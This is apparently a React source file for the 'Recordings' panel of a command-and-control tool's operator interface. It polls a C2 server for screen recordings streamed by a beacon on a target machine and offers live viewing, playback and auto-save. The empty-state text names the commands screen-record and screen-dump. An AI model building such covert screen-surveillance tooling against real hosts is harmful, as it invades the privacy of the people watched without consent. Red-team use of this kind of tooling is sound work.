import { useCallback, useEffect, useRef, useState } from 'react'
import { Film, Download, RefreshCw, Radio, Play } from 'lucide-react'
import { requestApi } from '@/hooks/useApi'
import { useStore } from '@/store'

/**
 * RecordingsPanel — dedicated tab for beacon screen recordings.
 *
 * The beacon streams recording segments as SCREEN_LIVE/SCREENREC results;
 * the C2 reconstructs them into artifacts under data/recordings/ (final
 * .mp4 per dump) and data/recordings/live/ (progressive segments). This
 * panel:
 *   - Live View: shows the newest segment the moment it lands (polling),
 *     so the operator watches the target screen while it records;
 *   - Library: every finished recording as a <video> player + download;
 *   - Save to disk through the native save dialog (main-process IPC).
 */

interface Artifact {
  name: string
  kind: 'image' | 'video' | 'file'
  dir: string
  size: number
  mtime: string
}

function fmtSize(n: number): string {
  if (n < 1024) return `${n} B`
  if (n < 1024 * 1024) return `${(n / 1024).toFixed(1)} KB`
  return `${(n / 1024 / 1024).toFixed(1)} MB`
}

export default function RecordingsPanel() {
  const activeBeacon = useStore((s) => s.activeBeacon)
  const pushToast = useStore((s) => s.pushToast)
  const saveRecordingsToDisk = useStore((s) => s.settings.save_recordings_to_disk)
  const [artifacts, setArtifacts] = useState<Artifact[]>([])
  const [selected, setSelected] = useState<Artifact | null>(null)
  const [mediaCache, setMediaCache] = useState<Map<string, string>>(new Map())
  const [lastSegCount, setLastSegCount] = useState(-1)
  const [refreshing, setRefreshing] = useState(false)
  const cacheRef = useRef<Map<string, string>>(new Map())

  const loadArtifactMedia = useCallback(async (a: Artifact): Promise<string | null> => {
    const key = `${a.dir}/${a.name}`
    if (cacheRef.current.has(key)) return cacheRef.current.get(key)!
    const res = await requestApi('GET', `/api/c2/artifact?dir=${encodeURIComponent(a.dir)}&name=${encodeURIComponent(a.name)}`)
    if (res.status !== 200) return null
    const d = res.data as { media: string; data: string }
    const src = `data:${d.media};base64,${d.data}`
    cacheRef.current.set(key, src)
    setMediaCache(new Map(cacheRef.current))
    return src
  }, [])

  const refresh = useCallback(async () => {
    setRefreshing(true)
    try {
      const res = await requestApi('GET', '/api/c2/artifacts')
      if (res.status === 200) {
        const all = ((res.data as { artifacts?: Artifact[] }).artifacts) || []
        setArtifacts(all.filter((a) => a.dir === 'recordings' || a.dir === 'recordings/live'))
      }
    } finally {
      setRefreshing(false)
    }
  }, [])

  // artifact list poll
  useEffect(() => {
    void refresh()
    const h = setInterval(() => void refresh(), 4000)
    return () => clearInterval(h)
  }, [refresh])

  // live-view poll: /api/c2/recordings/live tells how many segments landed
  useEffect(() => {
    if (!activeBeacon) return
    let cancelled = false
    const poll = async () => {
      const res = await requestApi('GET', `/api/c2/recordings/live?beacon_id=${encodeURIComponent(activeBeacon)}`)
      if (res.status !== 200 || cancelled) return
      const d = res.data as { count: number; segments: Array<{ segment: string; time: string }> }
      if (d.count === lastSegCount) return
      setLastSegCount(d.count)
      await refresh()
      // auto-open the newest segment so live view "moves"
      const res2 = await requestApi('GET', '/api/c2/artifacts')
      if (res2.status !== 200) return
      const all = ((res2.data as { artifacts?: Artifact[] }).artifacts) || []
      const segs = all.filter((a) => a.dir === 'recordings/live')
      if (segs.length > 0) setSelected(segs[0])
    }
    void poll()
    const h = setInterval(() => void poll(), 2500)
    return () => { cancelled = true; clearInterval(h) }
  }, [activeBeacon, lastSegCount, refresh])

  const saveToDisk = async (a: Artifact) => {
    const src = await loadArtifactMedia(a)
    if (!src) { pushToast({ title: 'Could not load artifact', type: 'error' }); return }
    const r = await window.phantom.saveArtifact({ name: a.name, data: src }, a.dir)
    if (r.saved) pushToast({ title: 'Saved', description: r.path, type: 'success' })
    else if (r.error) pushToast({ title: 'Save failed', description: r.error, type: 'error' })
  }

  // Auto-save (setting): when "Save recordings to disk" is ON, every
  // FINISHED recording (dir "recordings", i.e. a dumped .mp4) is copied to
  // ~/Desktop/Phantom Recordings once. Live segments are skipped on purpose
  // — they are transient and still growing; the dump is the real artifact.
  const autoSavedRef = useRef<Set<string>>(new Set())
  useEffect(() => {
    if (!saveRecordingsToDisk) return
    for (const a of artifacts) {
      if (a.dir !== 'recordings') continue
      const key = `${a.dir}/${a.name}`
      if (autoSavedRef.current.has(key)) continue
      autoSavedRef.current.add(key)
      void window.phantom
        .saveArtifactAuto({ name: a.name, data: '' }, a.dir)
        .then((r) => {
          if (r.saved) {
            pushToast({ title: 'Recording saved to Desktop', description: r.path, type: 'success' })
          } else if (r.error) {
            autoSavedRef.current.delete(key) // allow a retry on the next poll
          }
        })
    }
  }, [artifacts, saveRecordingsToDisk, pushToast])

  const selectedSrc = selected ? mediaCache.get(`${selected.dir}/${selected.name}`) : undefined

  return (
    <div className="h-full flex flex-col p-4 gap-4 overflow-auto">
      <div className="flex items-center justify-between">
        <div className="flex items-center gap-2">
          <Film size={18} className="text-phantom-cyan" />
          <h2 className="text-lg font-bold text-text-primary">Recordings</h2>
          {activeBeacon && (
            <span className="text-xs px-2 py-0.5 rounded-full bg-phantom-cyan/10 text-phantom-cyan">
              live beacon: {activeBeacon.slice(0, 8)}
            </span>
          )}
        </div>
        <button
          onClick={() => void refresh()}
          className="flex items-center gap-1.5 px-3 py-1.5 rounded bg-surface-card border border-surface-border text-xs text-text-secondary hover:text-text-primary hover:border-phantom-cyan/40"
        >
          <RefreshCw size={12} className={refreshing ? 'animate-spin' : ''} /> Refresh
        </button>
      </div>

      {/* Selected media viewer */}
      {selected && (
        <div className="rounded-lg border border-surface-border bg-surface-card p-3">
          <div className="flex items-center justify-between mb-2">
            <span className="text-xs font-mono text-text-secondary">{selected.name}</span>
            <button
              onClick={() => void saveToDisk(selected)}
              className="flex items-center gap-1 px-2.5 py-1 rounded bg-phantom-cyan/10 text-phantom-cyan text-xs hover:bg-phantom-cyan/20"
            >
              <Download size={12} /> Save to disk
            </button>
          </div>
          {selectedSrc ? (
            selected.kind === 'video' ? (
              <video src={selectedSrc} controls autoPlay muted className="w-full max-h-[420px] rounded bg-black" />
            ) : (
              <img src={selectedSrc} alt={selected.name} className="w-full max-h-[420px] rounded bg-black object-contain" />
            )
          ) : (
            <div className="h-48 flex items-center justify-center text-xs text-text-dim">loading…</div>
          )}
        </div>
      )}

      {/* Library */}
      <div>
        <div className="flex items-center gap-2 mb-2">
          <Radio size={13} className="text-text-dim" />
          <span className="text-xs font-semibold text-text-secondary uppercase tracking-wider">Library ({artifacts.length})</span>
        </div>
        {artifacts.length === 0 ? (
          <div className="text-xs text-text-dim p-6 text-center border border-dashed border-surface-border rounded-lg">
            No recordings yet. Start one from a beacon terminal: <code className="text-phantom-cyan">screen-record 30</code> or{' '}
            <code className="text-phantom-cyan">screen-record-live</code>, then <code className="text-phantom-cyan">screen-dump</code>.
          </div>
        ) : (
          <div className="grid grid-cols-2 md:grid-cols-3 gap-2">
            {artifacts.map((a) => {
              const key = `${a.dir}/${a.name}`
              const isNew = a.dir === 'recordings/live'
              return (
                <div
                  key={key}
                  className={`group rounded-lg border p-2.5 cursor-pointer transition-colors ${
                    selected?.name === a.name
                      ? 'border-phantom-cyan/60 bg-phantom-cyan/5'
                      : 'border-surface-border bg-surface-card hover:border-phantom-cyan/30'
                  }`}
                  onClick={() => {
                    setSelected(a)
                    void loadArtifactMedia(a)
                  }}
                >
                  <div className="flex items-center gap-2 mb-1">
                    {isNew ? <Play size={12} className="text-phantom-cyan" /> : <Film size={12} className="text-text-dim" />}
                    <span className="text-xs font-mono text-text-primary truncate flex-1">{a.name}</span>
                  </div>
                  <div className="flex items-center justify-between text-[10px] text-text-dim">
                    <span>{fmtSize(a.size)}</span>
                    <span>{a.mtime.split(' ')[1] || a.mtime}</span>
                  </div>
                  <div className="hidden group-hover:flex items-center gap-1 mt-1.5">
                    <button
                      onClick={(e) => { e.stopPropagation(); setSelected(a); void loadArtifactMedia(a) }}
                      className="text-[10px] px-1.5 py-0.5 rounded bg-surface-border text-text-secondary hover:text-text-primary"
                    >
                      play
                    </button>
                    <button
                      onClick={(e) => { e.stopPropagation(); void saveToDisk(a) }}
                      className="text-[10px] px-1.5 py-0.5 rounded bg-surface-border text-text-secondary hover:text-text-primary"
                    >
                      save
                    </button>
                  </div>
                </div>
              )
            })}
          </div>
        )}
      </div>
    </div>
  )
}
